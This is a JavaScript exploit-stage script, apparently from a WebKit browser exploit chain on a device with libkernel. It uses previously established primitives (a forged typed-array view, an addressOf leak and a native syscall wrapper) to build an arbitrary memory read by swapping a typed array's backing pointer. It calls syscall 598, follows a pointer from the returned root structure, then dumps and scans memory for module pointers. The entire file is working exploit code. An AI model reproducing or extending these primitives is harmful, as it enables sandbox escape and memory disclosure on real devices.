// Follow the module-space pointer 0x087ED52F08 from the +0x70 hop of the
// 598 root structure. This pointer lives in the module address space
// (0x08xxxxxxxx range, same as WebKit and libkernel bases). The probe
// reads 192 bytes at the target, scans for ASCII strings, and reports any
// pointers back into known regions (0x08xx module space, 0x34xx data
// region, 0x366x data region from prior boot — though the latter won't
// match on this boot). Also re-derives the root from 598 on this boot
// since the previous probe's session may have timed out. Read-only.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      typeof native.wrappers.sys598 !== "number")
    throw new Error("held_plan_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function toHex(bytes, cap) {
    var limit = Math.min(bytes.length, cap || 96);
    var out = "";
    for (var i = 0; i < limit; i++)
      out += ("0" + bytes[i].toString(16)).slice(-2);
    return out;
  }
  function toAscii(bytes, cap) {
    var limit = Math.min(bytes.length, cap || 96);
    var out = "";
    for (var i = 0; i < limit; i++) {
      var ch = bytes[i];
      out += (ch >= 32 && ch < 127) ? String.fromCharCode(ch) : ".";
    }
    return out;
  }
  function u64At(bytes, off) {
    return ((bytes[off]) | (bytes[off + 1] << 8) |
            (bytes[off + 2] << 16) | (bytes[off + 3] << 24)) +
           ((bytes[off + 4]) | (bytes[off + 5] << 8) |
            (bytes[off + 6] << 16) | (bytes[off + 7] << 24)) *
           0x100000000;
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("modptr_preflight");
  // Step 1: 598 → root base
  phase = "call_598";
  var sizePtrOff = 0x1e00;
  var bufOff = 0x200;
  var rootBufAddr = plan.addresses.frame + bufOff;
  var sizeAddr = plan.addresses.frame + sizePtrOff;
  var fv = new DataView(plan.frame.buffer);
  var sizeOrig = fv.getUint32(sizePtrOff, true);
  plan.frame.fill(0, bufOff, bufOff + 0x1000);
  fv.setUint32(sizePtrOff, 0x1000, true);
  fv.setUint32(sizePtrOff + 4, 0, true);
  var call598 = native.call("sys598", [rootBufAddr, sizeAddr]);
  fv.setUint32(sizePtrOff, sizeOrig, true);
  var rootLo = fv.getUint32(bufOff, true);
  var rootHi = fv.getUint32(bufOff + 4, true);
  var rootBase = rootHi * 0x100000000 + rootLo;
  mark("modptr_598_ok");
  // Step 2: read root +0x70 to get the module-space pointer
  phase = "root_read_0x70";
  var p70Bytes = readAt(rootBase + 0x70, 8);
  var modPtrLo = valueOf(p70Bytes.slice(0, 4).concat([0, 0, 0, 0]));
  var modPtrHi = valueOf(p70Bytes.slice(4, 8).concat([0, 0, 0, 0]));
  var modPtr = modPtrLo + modPtrHi * 0x100000000;
  // Extract the u64 at +0x78 (cross-region ptr)
  var crossBytes = readAt(rootBase + 0x78, 8);
  var crossPtrLo = valueOf(crossBytes.slice(0, 4).concat([0, 0, 0, 0]));
  var crossPtrHi = valueOf(crossBytes.slice(4, 8).concat([0, 0, 0, 0]));
  var crossPtr = crossPtrLo + crossPtrHi * 0x100000000;
  // Step 3: read 192 bytes at the module-space pointer
  phase = "module_ptr_read";
  mark("modptr_read_before");
  var modBytes = readAt(modPtr, 192);
  mark("modptr_read_after");
  var modHex = toHex(modBytes, 180);
  var modAscii = toAscii(modBytes, 180);
  // Scan for pointers in the read data
  var ptrsFound = "";
  for (var w = 0; w + 8 <= 192; w += 8) {
    var lo = ((modBytes[w]) | (modBytes[w + 1] << 8) |
              (modBytes[w + 2] << 16) | (modBytes[w + 3] << 24)) >>> 0;
    var hi = ((modBytes[w + 4]) | (modBytes[w + 5] << 8) |
              (modBytes[w + 6] << 16) | (modBytes[w + 7] << 24)) >>> 0;
    var u64 = hi * 0x100000000 + lo;
    if (u64 >= 0x800000000 && u64 < 0x900000000) {
      ptrsFound += "+" + w.toString(16) + ":" + u64.toString(16) + " ";
    }
  }
  // Step 4: also read the cross-region pointer target
  phase = "cross_read";
  var crossData = "";
  try {
    var crossRead = readAt(crossPtr, 64);
    crossData = toHex(crossRead, 64) + " | " + toAscii(crossRead, 32);
  } catch (crossError) {
    crossData = "ERR:" + String(crossError).slice(0, 60);
  }
  var after = native.call("getpid", []);
  mark("modptr_done");
  result = { id: "module_ptr_follow_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { root_base: rootBase.toString(16),
      mod_ptr: modPtr.toString(16),
      cross_ptr: crossPtr.toString(16),
      mod_hex: modHex, mod_ascii: modAscii,
      ptrs_in_mod: ptrsFound.trim(),
      cross_read: crossData,
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "module_ptr_follow_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
